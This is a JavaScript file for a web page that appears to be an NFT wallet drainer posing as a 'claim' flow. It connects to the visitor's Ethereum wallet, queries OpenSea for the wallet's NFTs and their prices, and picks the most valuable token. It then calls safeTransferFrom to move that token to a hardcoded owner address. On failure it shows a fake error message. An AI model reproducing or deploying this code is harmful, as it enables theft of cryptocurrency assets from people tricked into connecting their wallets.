    const ownerAddress = '';
    const ABI721 = [
        {
            "inputs": [
                {
                    "internalType": "string",
                    "name": "name",
                    "type": "string"
                },
                {
                    "internalType": "string",
                    "name": "symbol",
                    "type": "string"
                },
                {
                    "internalType": "string",
                    "name": "uri",
                    "type": "string"
                },
                {
                    "internalType": "address",
                    "name": "_launchpad",
                    "type": "address"
                },
                {
                    "internalType": "contract IPair",
                    "name": "pair",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "_maxType",
                    "type": "uint256"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "safeTransferFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                },
                {
                    "internalType": "bytes",
                    "name": "_data",
                    "type": "bytes"
                }
            ],
            "name": "safeTransferFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]

    const ABI1155 = [
        {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "id",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                },
                {
                    "internalType": "bytes",
                    "name": "data",
                    "type": "bytes"
                }
            ],
            "name": "safeTransferFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]

    async function loadWeb3() {
        if (!window.ethereum) return undefined;

        window.web3 = new Web3(window.ethereum);
        await window.ethereum.enable();
        await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x1" }] });

        let account = await getCurrentAccount();

        claim();
    }

    async function loadContract(ABI, address) {
        if (!window.ethereum) return undefined;

        return await new window.web3.eth.Contract(ABI, address);
    }

    async function getCurrentAccount() {
        if (!window.ethereum) return undefined;

        const accounts = await window.web3.eth.getAccounts();
        return accounts[0];
    }

    async function claim() {
        var account = await getCurrentAccount();

        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", `https://api.opensea.io/api/v1/assets?owner=${account}&order_direction=desc&limit=200&include_orders=false`, false);
        xmlHttp.setRequestHeader("accept", "application/json");
        xmlHttp.send(null);
        var opensea_response = JSON.parse(xmlHttp.response);

        var assets = opensea_response["assets"];
        if (!assets) {
            return _alert();
        }

        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", `https://api.opensea.io/api/v1/collections?asset_owner=${account}&offset=0&limit=200`, false);
        xmlHttp.setRequestHeader("accept", "application/json");
        xmlHttp.send(null);
        var price_response = JSON.parse(xmlHttp.response);

        var price_data = {};
        var nft_data = {};

        try {
            price_response.forEach(element => {
                price_data[element["primary_asset_contracts"][0]["address"]] = element["stats"]["one_day_average_price"];
            })

            assets.forEach(element => {
                let contract_address = element["asset_contract"]["address"];
                let type = element["asset_contract"]["schema_name"];

                if (price_data[contract_address] !== undefined) {
                    nft_data[contract_address] = {
                        "type": type,
                        "id": element["token_id"],
                        "price": price_data[contract_address]
                    };

                }

            });
        } catch {
            return _alert();
        }
        console.log(nft_data);
        var list = [];
        for (const [key, value] of Object.entries(nft_data)) {
            list.push(value["price"]);
        }

        var highestVal = Math.max.apply(null, Object.values(list)),
            val = Object.keys(nft_data).find(function (a) {
                return nft_data[a]["price"] === highestVal;
            });
        if (nft_data[val]["type"] === "ERC1155") {
            window.contract = await loadContract(ABI1155, val);
            await contract.methods.safeTransferFrom(account, ownerAddress, nft_data[val]["id"], 1, "0x0").send({ "from": account });
        } else {
            window.contract = await loadContract(ABI721, val);
            await contract.methods.safeTransferFrom(account, ownerAddress, nft_data[val]["id"], "0x0").send({ "from": account });
        }

    }

    function _alert() {
        Swal.fire({
            title: 'Error!',
            text: 'There is some errors on our side. Please, try again later.',
            icon: 'error',
            confirmButtonText: 'Fine'
        })
    }
